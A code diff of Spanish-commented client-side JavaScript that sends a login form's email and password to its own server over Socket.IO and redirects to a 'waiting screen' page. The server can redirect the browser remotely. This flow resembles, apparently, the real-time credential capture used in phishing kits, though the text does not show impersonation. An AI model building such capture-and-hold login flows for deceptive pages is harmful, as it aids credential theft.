@@ -1,75 +1,20 @@
+const socket = io(); // conectar con el servidor
+
 window.addEventListener('DOMContentLoaded', () => {
+  const form = document.getElementById('login-form');
 
-  document.getElementById('login-form').addEventListener('submit', function (e) {
-    e.preventDefault();
+  if (form) {
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
 
-    const usuario = document.getElementById('usuario').value;
-    const clave = document.getElementById('clave').value;
+      const correo = document.getElementById('usuario').value;
+      const contrasena = document.getElementById('clave').value;
 
-    fetch('/enviar', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usuario, clave })
-    })
-    .then(res => {
-      if (res.ok) {
-        window.location.href = 'opciones.html';
-      } else {
-        alert('Error al enviar datos');
-      }
-    });
-  });
+      // Emitimos los datos al servidor por socket
+      socket.emit('dataForm', { correo, contrasena });
 
-  // Conectar a Socket.IO solo si estamos en opciones.html
-  if (window.location.pathname.includes('opciones.html')) {
-    const socket = io();
-
-    socket.on('connect', () => {
-      console.log('🟢 Conectado al servidor de Socket.IO');
-    });
-
-    socket.on('redirect', (url) => {
-      console.log('🔁 Redirigiendo a:', url);
-      window.location.href = url;
+      // Redirigimos a la pantalla de espera
+      window.location.href = 'opciones.html';
     });
   }
 });
-
-// Esperar a que el DOM esté completamente cargado
-window.addEventListener('DOMContentLoaded', () => {
-  // Manejar el envío del formulario
-  document.getElementById('login-form').addEventListener('submit', function (e) {
-    e.preventDefault();
-
-    const usuario = document.getElementById('usuario').value;
-    const clave = document.getElementById('clave').value;
-
-    fetch('/enviar', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usuario, clave })
-    })
-    .then(res => {
-      if (res.ok) {
-        window.location.href = 'opciones.html';
-      } else {
-        alert('Error al enviar datos');
-      }
-    });
-  });
-
-  // Conectar a Socket.IO solo si estamos en opciones.html
-  if (window.location.pathname.includes('opciones.html')) {
-    const socket = io();
-
-    socket.on('connect', () => {
-      console.log('🟢 Conectado al servidor de Socket.IO');
-    });
-
-    socket.on('redirect', (url) => {
-      console.log('🔁 Redirigiendo a:', url);
-      window.location.href = url;
-    });
-  }
-});
-
